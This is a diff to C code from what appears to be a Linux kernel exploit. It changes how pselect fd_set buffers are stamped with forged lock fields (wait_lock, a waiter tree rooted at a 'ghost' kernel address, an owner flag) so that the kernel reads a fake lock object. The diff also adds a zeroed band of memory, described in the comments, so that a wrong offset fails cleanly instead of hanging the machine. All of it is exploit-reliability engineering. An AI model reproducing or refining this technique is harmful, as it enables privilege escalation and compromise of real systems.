@@ -528,11 +528,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
       int ghost_self_lock = 0;
       if (g_ghost_kva &&
           env_int_range("PSELECT_GHOST_SELF_LOCK", 0, 0, 1)) {
-        ghost_lock_word = g_ghost_kva + 0x50;
-        ex_stamp[0] = 0;            /* wait_lock: unlocked            */
-        ex_stamp[1] = g_ghost_kva;  /* waiters.rb_root.rb_node=ghost  */
-        ex_stamp[2] = g_ghost_kva;  /* waiters.rb_leftmost=ghost      */
-        ex_stamp[3] = 1;            /* owner = NULL|HAS_WAITERS       */
+        /* Lock at ghost+0xA0 (waiter word 20, NFDS=512 layout): the ten
+         * qwords BELOW it (words 10-19) are stamped ZERO — a wrong
+         * (negative) delta makes the kernel read wait_lock/root from the
+         * zero band → clean gate exit, never a qspinlock hang (the jc28
+         * wedge class). Only the exact delta roots the tree at the ghost. */
+        ghost_lock_word = g_ghost_kva + 0xA0;
+        ex_stamp[0] = 0;            /* word20 wait_lock: unlocked      */
+        ex_stamp[1] = g_ghost_kva;  /* word21 waiters root = ghost     */
+        ex_stamp[2] = g_ghost_kva;  /* word22 waiters leftmost = ghost */
+        ex_stamp[3] = 1;            /* word23 owner = NULL|HAS_WAITERS */
         ghost_self_lock = 1;
       }
       struct pselect_waiter_word jc2_words[] = {
@@ -567,13 +572,13 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                                 jc2_words[i].name);
       }
       if (ghost_self_lock) {
-        /* waiter words 10..13 → global fdset words 10..13 = ex[0..3]:
-         * the self-referencing lock lives entirely in the stamp. */
+        /* waiter words 20..23 (ex[4..7] at NFDS=512): the lock block;
+         * words 10..19 stay ZERO (the negative-delta safety band). */
         struct pselect_waiter_word lock_words[] = {
-            {10, ex_stamp[0], "lk_wait_lock"},
-            {11, ex_stamp[1], "lk_root"},
-            {12, ex_stamp[2], "lk_leftmost"},
-            {13, ex_stamp[3], "lk_owner"},
+            {20, ex_stamp[0], "lk_wait_lock"},
+            {21, ex_stamp[1], "lk_root"},
+            {22, ex_stamp[2], "lk_leftmost"},
+            {23, ex_stamp[3], "lk_owner"},
         };
         for (size_t i = 0; i < sizeof(lock_words) / sizeof(lock_words[0]);
              i++)
